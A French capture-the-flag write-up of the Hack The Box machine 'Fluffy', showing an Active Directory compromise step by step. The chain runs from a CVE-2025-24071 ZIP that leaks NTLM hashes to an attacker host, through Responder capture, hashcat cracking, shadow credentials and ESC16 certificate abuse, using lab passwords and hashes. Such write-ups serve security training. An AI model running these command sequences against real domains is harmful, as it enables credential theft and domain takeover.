---
title: "HTB Write-up - Fluffy"
date: 2026-10-27
categories: [offensive, htb]
tags: [hackthebox, windows, easy, active-directory]
image:
  path: /assets/img/htb/fluffy/card_htb_baby.png
---

## Contexte
> - Nom: Fluffy
> - Type: Windows
> - Niveau: Easy

La box `Fluffy` est une box Windows de type AD (Active Directory), issue du la liste de machine `CPTS Preparation` proposé sur la plateforme afin de préparer la certification ! C'est une machine que j'ai trouvé interessante dans la manière de faire travailler les élévations de privilèges latérales. 

Il faut savoir que pour cette machine, nous avons un premier couple d'identifiant / mot de passe pour notre audit, comme nous pouvons l'avoir en mode `greybox` dans un engagement réel.

Il s'agit des identifiants suivants :
```text
User: j.fleischman
Password: J0elTHEM4n1990!
```

## Enumeration
Nous allons commencer par énumérer les différents ports ouverts sur notre cible à l'aide de `nmap`

**scan nmap**
```bash
$ nmap 10.129.89.38 -p- -sS -T4
```

- -p- : pour lister tous les ports TCP
- -sS : pour réaliser un scan SYN (plus rapide)
- -T4 : définit le niveau d'agressivité et la vitesse du scan (4 étant agressif)


![Résultat du scan nmap](/assets/img/htb/fluffy/nmap_scan.png)
_Résultat du scan nmap_


Grâce à ce résultat, nous pouvons déceler quelques pistes de compromission envisageables.

Par exemple :
- 445 - SMB: accès à des partages réseaux sans authentification
- 88 - Kerberos: possibilité d'énumérer les utilisateurs
- 389 - LDAP: énumération des utilisateurs par LDAP
- 139/135 - netbios et msrpc

### Partage SMB
Avant d'aller plus loin, nous allons tenter de nous connecter de manière authentifié avec le compte fournis aux partages SMB. Si cela se produit, nous pourrons sans doutes acceder à des informations pertinentes qui nous permettront d'aller plus loin.

**smbclient**
```bash
$ smbmap -H "10.129.89.38" -u "j.fleischman" -p 'J0elTHEM4n1990!'
```

Nous nous retrouvons donc avec une liste de partage réseau, dont un où nous avons un accès `Lecture / Ecriture`, il s'agit du partage `IT` !

![Résultat de smbmap](/assets/img/htb/fluffy/smbmap_list.png)
_Résultat de smbmap_

Nous allons donc nous y connecter.

### Récolte d'informations par SMB
Nous allons nous connecter au partage avec l'outil `smbclient-ng`, afin de voir si nous pouvons trouver des informations pertinentes pour la suite.

**connexion au partage**
```bash
$ smbclientng -u "j.fleischman" -p 'J0elTHEM4n1990!' --host "10.129.89.38"
```
Une fois connecté, nous allons utiliser les commandes suivantes, pour :
- selectionner le partage `IT`
- lister les fichiers et repertoires du partage

```shell
■[\\10.129.89.38\]> use IT
■[\\10.129.89.38\IT\]> ls
```

![Liste des fichiers présents sur IT](/assets/img/htb/fluffy/enum_share_content.png)
_Liste des fichiers présents sur IT_

Nous pouvons y voir, des fichiers `zip`, de logiciels, des repertoires, et surtout, un fichier `pdf`. Nous allons télécharger ce dernier.

```shell
$ get Upgrade_Notice.pdf
```
![Téléchargemement de Upgrade_Notice.pdf](/assets/img/htb/fluffy/get_Upgrade_Notice.png)
_Téléchargemement de Upgrade_Notice.pdf_

Et nous pouvons désormais ouvrir ce dernier.

## Exploitation

### Analyse du PDF
Ce PDF est en réalité un rapport de scan de vulnérabilités qui met en évidence plusieurs vulnérabilités (CVE) affectant le système, ainsi que des recommandations de mise à jour.
![Rapport PDF](/assets/img/htb/fluffy/vuln_report.png)
_Rapport PDF_

Après une première recherche sur la `CVE-2025-24996`, rien de pertinent à son sujet. En revanche, la `CVE-2025-24071` semble s'intégrer parfaitement dans notre situation, de plus elle possède des `exploits` publiques. 

Sur le site suivant la description de la CVE ets plutôt intéressante : 
- https://nsfocusglobal.com/windows-file-explorer-spoofing-vulnerability-cve-2025-24071/

![Description CVE-2025-24071](/assets/img/htb/fluffy/CVE-2025-24071_desc.png)
_Description CVE-2025-24071_

> En gros l'objectif est de démontrer qu'une archive spécialement conçue peut déclencher une authentification SMB et exposer le hash NTLM de la victime.

Dans l'idée, le process est le suivant : 
1. Préparation : l’attaquant crée un fichier `.library-ms` contenant une référence vers un partage SMB distant qu’il contrôle.
2. Packaging : ce fichier est placé dans une archive ZIP ou RAR.
3. Déclenchement : la victime extrait l’archive sur un système Windows vulnérable.
4. Requête SMB : Windows tente de contacter le serveur distant et peut initier une authentification NTLM.
5. Capture : côté serveur, l’attaquant observe la tentative d’authentification et récupère éventuellement une réponse NTLM challenge-response.

Pour cela il faudrait un accès en écriture sur un partage SMB... ça tombe bien on a possibilité de déposer des fichiers dans le share `IT` !

### Exploitation de CVE-2025-24996

Un POC publique est disponible sur le Github suivant :
- https://github.com/ThemeHackers/CVE-2025-24071

Une fois l'exploit en notre posession, nous pouvons créer notre archive qui contient la charge malveillante.
```shell
$ python3 poc.py -i 10.10.15.203 -f exploit.zip
```

> Là ou 10.10.15.203 correspond à l'IP où l'utilisateur va envoyer sa requête SMB, donc l'adresse IP de notre machine.

![Création du ZIP](/assets/img/htb/fluffy/use_exploit.png)
_Création du ZIP_

Dans une autre fenêtre, on va lancer Responder pour intercepter la requête SMB qui va nous parvenir !
```shell
$ responder -I tun0
```

![Lancement de Responder](/assets/img/htb/fluffy/run_responder.png)
_Lancement de Responder_

Dans le terminal où nous sommes connectés en SMB, nous allons téléverser notre fichier exploit.zip.
```shell
$ put exploit.zip
```
![Envoi du ZIP](/assets/img/htb/fluffy/send_zip.png)
_Envoi du ZIP_

En revenant sur Responder, nous pouvons constater que nous avons intercepté le hash NetNTLMv2 de l’utilisateur `p.agila` !
![Reception du NTLMV2](/assets/img/htb/fluffy/get_ntml.png)
_Reception du NTLMV2_


Nous allons maintenant tenter de casser le hash.

Pour cela, nous allons enregistrer le hash dans un fichier nommé `hash`, puis utiliser `hashcat` la wordlist `rockyou.txt` pour lancer une attaque par dictionnaire.
```
$ hashcat hash /usr/share/wordlists/rockyou.txt
```

![Lancement de hashcat](/assets/img/htb/fluffy/use_hashcat.png)
_Lancement de hashcat_

Bingo ! Nous avons réussi à casser le hash et à retrouver le mot de passe de l'utilisateur `p.agila` : `prometheusx-303`.
![Résultat de hashcat](/assets/img/htb/fluffy/result_hashcat.png)
_Résultat de hashcat_


### Rabbit Hole
Premiers réflèxes, avec ce nouveau compte, c'est bien sûr de tenter de se connecter en `winrm` sur ce compte afin d'avoir un accès distant.

```shell
$ nxc winrm "10.129.89.38" -u "p.agila" -p "prometheusx-303"
```

Mais sans succès.
![Tentative de connexion en WINRM](/assets/img/htb/fluffy/test_winrm.png)
_Tentative de connexion en WINRM_

Nous exportons alors la liste des utilisateurs afin de réaliser une attaque par `password spraying` et de vérifier si le mot de passe récupéré est réutilisé par d’autres comptes.
```shell
$ nxc smb "10.129.89.38" -u "p.agila" -p "prometheusx-303" --users-export users.txt
```

Puis nous tentons le mot de passe sur la liste des utilisateurs
```shell
$ nxc smb "10.129.89.38" -u users.txt -p "prometheusx-303" --continue-on-success
```

Mais sans succès également.
![Tentative de Password Spray](/assets/img/htb/fluffy/test_ps.png)
_Tentative de Password Spray_

Dernière option : utiliser `BloodHound` pour analyser les relations et les permissions au sein du domaine. Il est possible que l'utilisateur `p.agila` dispose d'ACL lui permettant d'agir sur d'autres comptes ou objets Active Directory.

On commence par ajouter `fluffy.htb` au fichier `/etc/hosts` afin de pouvoir résoudre le nom de domaine et contacter le contrôleur de domaine.
```shell
$ echo "10.129.89.38 fluffy.htb" >> /etc/hosts
```

Ensuite, on utilise RustHound pour collecter les informations du domaine avec les identifiants de `p.agila`, puis générer les données exploitables dans `BloodHound`.
```shell
$ rusthound -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -o /tmp/fluffy -z
```
![Extraction par Rusthound](/assets/img/htb/fluffy/rusthound_extract.png)
_Extraction par Rusthound_

On lance ensuite `BloodHound`, puis on importe l'archive ZIP contenant les informations du domaine collectées par `RustHound`.

Une fois l'import terminé, on recherche l'utilisateur `p.agila` afin d’analyser ses relations, ses permissions et les éventuelles ACL dont il dispose sur d’autres objets Active Directory.
![agila sur bloodhound](/assets/img/htb/fluffy/first_bh.png)
_agila sur bloodhound_


On constate que le groupe `SERVICE ACCOUNT MANAGERS@FLUFFY.HTB` dont `p.agila` fait parti, dispose du droit `GenericAll` sur le groupe `SERVICE ACCOUNTS@FLUFFY.HTB`.
![Relation de groupe agila](/assets/img/htb/fluffy/agila_relation.png)
_Relation de groupe agila_

`GenericAll` correspond à un contrôle total sur l'objet cible. Ce privilège permet à son détenteur de modifier l’objet et d’effectuer les actions autorisées par ce niveau de contrôle.

En pratique, cela signifie que les membres de `SERVICE ACCOUNT MANAGERS` disposent de permissions étendues sur le groupe `SERVICE ACCOUNTS`. Il faut ensuite analyser les possibilités d'exploitation de cette relation pour déterminer si elle permet d'obtenir des privilèges supplémentaires dans le domaine.

## Privilege Escalation

### User Flag
> Le contrôle total d'un groupe vous permet de modifier directement les membres qui le composent. Utilisez l'outil `net` de Samba pour ajouter l'utilisateur au groupe cible. Les identifiants peuvent être fournis en clair ou saisis de manière interactive si vous ne les précisez pas dans la ligne de commande :

```shell
net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY"/"p.agila"%"prometheusx-303" -S "10.129.89.38"
```

Via cette commande nous allons ajouter `p.agila` au groupe `"SERVICE ACCOUNTS"``
![Ajout de p.agila au groupe SERVICE ACCOUNTS](/assets/img/htb/fluffy/add_group.png)
_Ajout de p.agila au groupe SERVICE ACCOUNTS_


En examinant les membres du groupe `SERVICE ACCOUNTS`, on constate que ce groupe dispose du droit `GenericWrite` sur les comptes suivants :
- winrm_svc
- ca_svc
- ldap_svc

Qu'est-ce que cela implique ?
Le droit GenericWrite permet de modifier certains attributs de l'objet Active Directory ciblé. Contrairement à `GenericAll`, il ne donne pas un contrôle total sur l'objet.

Dans notre cas, les membres de `SERVICE ACCOUNTS` disposent donc de permissions permettant de modifier certains attributs de ces trois comptes de service.

> En pratique, cela peut ouvrir plusieurs possibilités d'exploitation, selon les attributs modifiables et la configuration d'Active Directory. Par exemple, certaines modifications peuvent permettre de détourner des mécanismes d'authentification ou de faciliter une élévation de privilèges.

![GenericWrite sur les membres de SERVICE ACCOUNTS](/assets/img/htb/fluffy/gw_sa_member.png)
_GenericWrite sur les membres de SERVICE ACCOUNTS_


Le compte `winrm_svc` est particulièrement intéressant, car il est membre du groupe `REMOTE MANAGEMENT USERS`.

**Pourquoi est-ce intéressant ?**
Ce groupe permet généralement à ses membres de se connecter à distance à une machine Windows via WinRM (Windows Remote Management), notamment avec des outils comme `Evil-WinRM`, sous réserve que le service soit accessible et que les autorisations nécessaires soient en place.
![Winrm_svc membre de RMU](/assets/img/htb/fluffy/wsvc_rmu.png)
_Winrm_svc membre de RMU_

Nous allons tenter une `Shadow Credentials Attack`, car nous avons identifié que le groupe `SERVICE ACCOUNTS` dispose du droit `GenericWrite` sur le compte `winrm_svc`.

**Pourquoi cette attaque ?**
L'attaque `Shadow Credentials` exploite le mécanisme `Key Credentials` d'Active Directory, utilisé notamment par `Windows Hello for Business` pour l'authentification par clé publique.

En disposant des permissions nécessaires pour modifier l'attribut `msDS-KeyCredentialLink` d'un compte, un attaquant peut y ajouter une clé publique qu'il contrôle, sous certaines conditions.

Le principe est le suivant :
1. Exploiter `GenericWrite` : vérifier que les permissions permettent de modifier l'attribut `msDS-KeyCredentialLink` du compte `winrm_svc`.
2. Associer une clé au compte : ajouter une clé publique contrôlée par l'attaquant à l'objet Active Directory.
3. S'authentifier avec la clé privée correspondante : si les conditions sont réunies, utiliser Kerberos et PKINIT pour obtenir des éléments d'authentification associés à `winrm_svc`.
4. Tester l'accès distant : vérifier si les identifiants ou tickets obtenus permettent une connexion WinRM.

```shell
$ certipy shadow auto -u "p.agila"@"fluffy.htb" -p "prometheusx-303" -account "winrm_svc"
```

Et nous pouvons voir que cal a fonctionné et nous avons récupérer le hash NT de `winrm_svc`
![Shadow Credential Attack](/assets/img/htb/fluffy/sca.png)
_Shadow Credential Attack_

Nous pouvons désormais nous connecter avec `evil-winrm`, et récupérer le flag `utilisateur`
```shell
evil-winrm-py --ip "10.129.89.38" --user "winrm_svc" -H "33bd09dcd697600edf6b3a7af4875767"
```
![Récupération du flag utilisateur](/assets/img/htb/fluffy/user_flag.png)
_Récupération du flag utilisateur_


### Root Flag
Maintenant nous allons tenter d'accèder au compte administrateur.

Nous allons maintenant nous intéresser au compte `ca_svc`, qui présente un intérêt particulier. En effet, il appartient au groupe `CERT PUBLISHERS@FLUFFY.HTB` et sa description laisse entendre qu'une autorité de certification Active Directory (AD CS) est présente dans le domaine.
![Détection de ADCS](/assets/img/htb/fluffy/detect_adcs.png)
_Détection de ADCS_

Nous allons donc utiliser **Certipy** pour rechercher une éventuelle mauvaise configuration de l'infrastructure AD CS, susceptible d'être exploitable.

Pour cela, nous devrons utiliser le compte `ca_svc`, car il pourrait disposer des autorisations nécessaires pour soumettre une demande de certificat (*certificate request*) auprès de l'autorité de certification.

L'objectif est d'identifier une éventuelle vulnérabilité liée aux certificats et de déterminer si elle peut nous permettre d'obtenir des privilèges supplémentaires dans le domaine. 

```shell
$ certipy shadow auto -u "p.agila"@"fluffy.htb" -p "prometheusx-303" -account "ca_svc"
```
![Récupération du hash nt de ca_svc](/assets/img/htb/fluffy/get_ca_svc.png)
_Récupération du hash nt de ca_svc_

Désormais nous allons tenter d'énumérer l'infrastructure AD CS du domaine et de rechercher les configurations potentiellement vulnérables, en s'authentifiant avec le compte ca_svc à l'aide de son hash NTLM.

```shell
$ certipy find -u ca_svc -hashes "ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip "10.129.232.88" -vulnerable -enable
```
![Enumeration avec certipy](/assets/img/htb/fluffy/certipy_enum.png)
_Enumeration avec certipy_

On ouvre le fichier `20261027182330_Certipy.txt` généré par `Certipy`. On constate que l'autorité de certification Active Directory présente une mauvaise configuration identifiée comme `ESC16`. 

Cela signifie que l'autorité de certification est configurée pour désactiver l'extension de sécurité contenant le SID du compte dans les certificats qu'elle délivre.

Cette extension est importante, car elle permet au contrôleur de domaine de vérifier que le certificat présenté correspond bien à l'identité Active Directory revendiquée.
![Dection de ESC16](/assets/img/htb/fluffy/ESC16_detect.png)
_Dection de ESC16_

En exploitant les permissions de `p.agila` sur le compte `ca_svc`, nous utilisons `Certipy` pour modifier son attribut `UPN` (*User Principal Name*) afin qu’il corresponde à celui du compte `administrator`. Cela nous permet de préparer une usurpation d’identité lors de l’exploitation de la vulnérabilité `ESC16`.
```shell
$ certipy account -u p.agila -p 'prometheusx-303' -target 'dc01.fluffy.htb' -upn 'administrator' -user 'ca_svc' update
```
![Modification du UPN](/assets/img/htb/fluffy/esc_step1.png)
_Modification du UPN_

Cette commande nous a permis de modifier l’attribut `userPrincipalName` du compte `ca_svc` pour lui attribuer l’UPN `administrator`. L’objectif est de tromper l’autorité de certification afin qu’elle associe la demande de certificat à l’identité de l’administrateur.

Nous allons maintenant demander un certificat.

Puisque le compte `ca_svc` possède désormais l’UPN de `administrator`, nous lui demandons un certificat afin de tenter d’usurper l’identité de ce dernier.
```shell
$ certipy req -dc-ip '10.129.232.88' -u 'ca_svc' -hashes "ca0f4f9e9eb8a092addf53bb03fc98c8" -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
```
![Requête du certificat](/assets/img/htb/fluffy/esc_step2.png)
_Requête du certificat_

Cette opération nous a permis d'obtenir un fichier de certificat au format `.pfx` associé à l'UPN de `administrator`. Nous disposons ainsi d'un certificat que nous allons pouvoir utiliser pour tenter de nous authentifier en tant qu'administrateur.

Avant de l'utiliser, nous devons toutefois **restaurer l'UPN d'origine du compte `ca_svc`**. Cela permet d'éviter que deux comptes Active Directory possèdent le même UPN, ce qui pourrait entraîner des conflits lors de l'authentification.

Nous rétablissons donc l'UPN initial de `ca_svc`.


```shell
$ certipy account -u p.agila -p 'prometheusx-303'  -target 'dc01.fluffy.htb' -upn 'ca_svc' -user 'ca_svc' update
```
![Restauration du UPN](/assets/img/htb/fluffy/esc_step3.png)
_Restauration du UPN_

#### Authentification et récupération du véritable hash NT

Nous utilisons maintenant le certificat `.pfx` obtenu précédemment pour tenter de nous authentifier en tant qu'`administrator`.

Si l'authentification réussit, nous pouvons obtenir un ticket Kerberos de type `TGT` (*Ticket-Granting Ticket*) ainsi que le hash `NT` du véritable compte administrateur.

```shell
$ certipy auth -dc-ip '10.129.232.88' -pfx administrator.pfx -username 'Administrator' -domain 'fluffy.htb'
```
![Récupération du hash NT administrateur](/assets/img/htb/fluffy/esc_step4.png)
_Récupération du hash NT administrateur_


#### Récapitulatif de ESC16

### Résumé de l'exploitation ESC16

1. **Énumération AD CS** : avec `Certipy`, nous avons identifié une mauvaise configuration `ESC16` sur l'autorité de certification.

2. **Modification de l'UPN** : grâce aux permissions de `p.agila` sur `ca_svc`, nous avons modifié son attribut `userPrincipalName` pour qu'il corresponde à celui d'`administrator`.

3. **Demande de certificat** : nous avons demandé un certificat au nom de cet UPN, ce qui nous a permis d'obtenir un fichier `.pfx`.

4. **Restauration de l'UPN** : nous avons remis l'UPN d'origine de `ca_svc` pour éviter de laisser cette modification en place.

5. **Authentification par certificat** : nous avons utilisé le fichier `.pfx` pour tenter de nous authentifier en tant qu'`administrator` et obtenir un ticket Kerberos `TGT` ainsi que son hash `NT`, si les conditions d'exploitation étaient réunies.

**Principe clé :** la vulnérabilité `ESC16`, combinée aux permissions sur `ca_svc`, nous a permis de tenter de faire associer un certificat à l'identité d'un autre compte, sans connaître son mot de passe.

##### Comment avons-nous usurpé l'identité d'Administrator ?

Nous avons modifié temporairement l'attribut `userPrincipalName` (`UPN`) de `ca_svc` pour qu'il corresponde à celui d'`administrator`, puis demandé un certificat `.pfx` pendant que cette modification était active.

Grâce à la mauvaise configuration `ESC16`, le certificat obtenu a pu être utilisé pour tenter une authentification Kerberos sous l'identité d'`administrator`. Nous avons ainsi pu récupérer un `TGT` et le hash `NT` du compte, si l'authentification aboutissait.

**En résumé :** nous avons détourné le mécanisme de confiance des certificats pour faire reconnaître notre authentification comme celle d'`administrator`, sans connaître son mot de passe.



#### Récupération du flag Root
Maintenant que nous avons le hash NT du compte administrateur, nous pouvons nous connecter par `winrm` en tant qu'administrateur et récupérer le flag !

```shell
$ evil-winrm-py --ip "10.129.232.88" --user "Administrator" -H "8da83a3fa618b6e3a00e93f676c92a6e"
```
![Récupération flag administrateur](/assets/img/htb/fluffy/root.png)
_Récupération flag administrateur_